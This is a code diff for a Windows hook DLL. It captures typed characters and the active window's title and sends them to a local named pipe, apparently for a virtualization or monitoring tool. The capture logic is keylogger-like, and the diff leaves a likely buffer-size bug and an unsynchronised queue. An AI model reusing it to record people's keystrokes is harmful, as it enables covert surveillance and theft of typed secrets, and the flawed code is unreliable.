@@ -15,7 +15,6 @@ typedef struct tagMsgOut {
 } MsgOut, * pMsgOut;
 #pragma pack()
 
-
 std::queue<MsgOut> queueOut;
 
 void dprintf(const char* pszFmt, ...){
@@ -30,12 +29,41 @@ void dprintf(const char* pszFmt, ...){
 
 #define BUFSIZE 512
 
-int loopNamedPipe()
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		dprintf("DLL_PROCESS_ATTACH\n");
+		break;
+	case DLL_THREAD_ATTACH:
+		dprintf("DLL_THREAD_ATTACH\n");
+		break;
+	case DLL_THREAD_DETACH:
+		dprintf("DLL_THREAD_DETACH\n");
+		break;
+	case DLL_PROCESS_DETACH:
+		dprintf("DLL_PROCESS_DETACH:%S\n", exeName.c_str());
+		break;
+	}
+	return TRUE;
+}
+
+void CALLBACK timerProc(HWND hwnd, UINT uMsg, UINT timerId, DWORD dwTime)
 {
 	HANDLE hPipe;
 	BOOL   fSuccess = FALSE;
-	DWORD  cbToWrite, cbWritten, dwMode;
+	DWORD  cbWritten;
 	const wchar_t* lpszPipename = TEXT("\\\\.\\pipe\\cameyoNamedPipe");
+
+	if (!queueOut.size()) {
+		dprintf("queueOut is empty\n");
+		return;
+	}
 
 	while (1) {
 		hPipe = CreateFile(
@@ -51,146 +79,57 @@ int loopNamedPipe()
 		if (hPipe != INVALID_HANDLE_VALUE)
 			break;
 
-		if (GetLastError() != ERROR_PIPE_BUSY){
+		if (GetLastError() != ERROR_PIPE_BUSY) {
 			dprintf("Could not open the pipe. GLE=%d\n", GetLastError());
-			return -1;
+			return;
 		}
 
-		if (!WaitNamedPipe(lpszPipename, 20000)){
+		if (!WaitNamedPipe(lpszPipename, 20000)) {
 			dprintf("Could not open pipe: 20 second wait timed out.");
-			return -1;
+			return;
 		}
 	}
 	dprintf("pipe connected\n");
-
-	dwMode = PIPE_READMODE_MESSAGE;
-	fSuccess = SetNamedPipeHandleState( hPipe, &dwMode, NULL, NULL);
-
-	if (!fSuccess){
-		dprintf("could not switch the pipe to the message mode, GLE=%d\n", GetLastError());
-		return -1;
-	}
-
-	while (loopQueue) {
-		if (!TryEnterCriticalSection(&CriticalSection)) {
-			dprintf("CRITICAL: *** failed to enter CriticalSection ***\n");
-			Sleep(100);
-			break;
-		}
-
-		if (!queueOut.size()) {
-			LeaveCriticalSection(&CriticalSection);
-			Sleep(100);
-			continue;
-		}
-
+	while (queueOut.size()) {
 		auto msg = queueOut.front();
-		//dprintf("wparam=%c, queueOut: %u\n", msg.codeChar, queueOut.size());
-		//cbToWrite = sizeof(int);
-		//memcpy((void*)&msg1, data, sizeof(MsgOut));
-
-		fSuccess = WriteFile( hPipe, (void*)&msg, sizeof(MsgOut), &cbWritten, NULL);
-
+		fSuccess = WriteFile(hPipe, (void*)&msg, sizeof(MsgOut), &cbWritten, NULL);
 		if (!fSuccess) {
 			dprintf("WriteFile to pipe failed. GLE=%d\n", GetLastError());
-			return -1;
+			return;
 		}
 		queueOut.pop();
-		LeaveCriticalSection(&CriticalSection);
 	}
-
+	dprintf("queue drained\n");
 	CloseHandle(hPipe);
-
-	return 0;
-}
-
-void hookThread() {
-
-	if (!InitializeCriticalSectionAndSpinCount( &CriticalSection, 0x00000400 )) {
-		dprintf("failed - InitializeCriticalSectionAndSpinCount\n");
-		return;
-	}
-
-	TCHAR szExeFileName[MAX_PATH];
-	GetModuleFileName(NULL, szExeFileName, MAX_PATH);
-	exeName = szExeFileName;
-	int pos = exeName.find_last_of(L"\\");
-	exeName = exeName.substr(pos + 1, exeName.length());
-	dprintf("%S attached\n", exeName.c_str());
-
-	try {
-		loopNamedPipe();
-	}
-	catch (std::exception const& ex) {
-		dprintf("exception loopNamedPipe() STL: %s", ex.what());
-	}
-
-	dprintf("INFO: Terminating thread\n");
-	//std::wstring message = L"Hooked into " + exeName + L" (PID " + std::to_wstring(GetCurrentProcessId()) + L")";
-}
-
-HANDLE hookThreadHandle = NULL;
-
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
-{
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-		//hookThreadHandle = CreateThread(NULL, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(hookThread), NULL, 0, 0);
-		dprintf("DLL_PROCESS_ATTACH\n");
-        break;
-    case DLL_THREAD_ATTACH:
-		dprintf("DLL_THREAD_ATTACH\n");
-		break;
-    case DLL_THREAD_DETACH:
-		dprintf("DLL_THREAD_DETACH\n");
-		break;
-    case DLL_PROCESS_DETACH:
-		dprintf("DLL_PROCESS_DETACH:%S\n", exeName.c_str());
-		//loopQueue = false;
-		//WaitForSingleObject(hookThreadHandle, INFINITE);
-		//DeleteCriticalSection(&CriticalSection);
-        break;
-    }
-    return TRUE;
-}
-
-void CALLBACK f(HWND hwnd, UINT uMsg, UINT timerId, DWORD dwTime)
-{
-	dprintf("Hello\n");
 }
 
 extern "C" __declspec(dllexport) int NextHook(int code, WPARAM wParam, LPARAM lParam) {
 
 	if (!gInit) {
-		SetTimer(NULL, 0, 1000, (TIMERPROC)&f);
+		TCHAR szExeFileName[MAX_PATH];
+		GetModuleFileName(NULL, szExeFileName, MAX_PATH);
+		exeName = szExeFileName;
+		size_t pos = exeName.find_last_of(L"\\");
+		exeName = exeName.substr(pos + 1, exeName.length());
+		dprintf("%S attached\n", exeName.c_str());
+		SetTimer(NULL, 0, 1000, (TIMERPROC)&timerProc);
 		gInit = true;
 	}
 
-	SetTimer(NULL, 0, 1000 * 60, (TIMERPROC)&f);
-	if ( code >= 0 && ((MSG*)lParam)->message == WM_CHAR) {
-		if (TryEnterCriticalSection(&CriticalSection)){
-			//GetWindowText
-			MsgOut msg = { .codeChar = (int)((MSG*)lParam)->wParam, .strWindowName = L"Testing 123", .strProcessName = L"Testing 345" };
-			//msg.codeChar = ((MSG*)lParam)->wParam;
-			queueOut.push(msg);
-			dprintf("code=%u, wparam=%c, queueOut: %u\n", code, ((MSG*)lParam)->wParam, queueOut.size() );
-			LeaveCriticalSection(&CriticalSection);
-		}
-		else{
-			dprintf("CRITICAL: failed to enter CriticalSection in the hook\n");
-		}
+	if (code < 0)
+		return (LRESULT)CallNextHookEx(NULL, code, wParam, lParam);
+
+	if (((MSG*)lParam)->message == WM_CHAR) {
+		//MsgOut msg = { .codeChar = (int)((MSG*)lParam)->wParam, .strWindowName = L"Testing 123", .strProcessName = L"Testing 345" };
+		MsgOut msg = { 0, };
+		msg.codeChar = (int)((MSG*)lParam)->wParam;
+		GetWindowText( ((MSG*)lParam)->hwnd, msg.strWindowName, sizeof(msg.strWindowName) );
+		queueOut.push(msg);
+		dprintf("code=%u, wparam=%c, queueOut: %u\n", code, ((MSG*)lParam)->wParam, queueOut.size());
 	}
+
+	//if (((MSG*)lParam)->message == WM_QUIT){
+		//dprintf("WM_QUIT\n");
+	//}
 	return (LRESULT)CallNextHookEx(NULL, code, wParam, lParam);
 }
-
-
-
-
-
-
-	
-
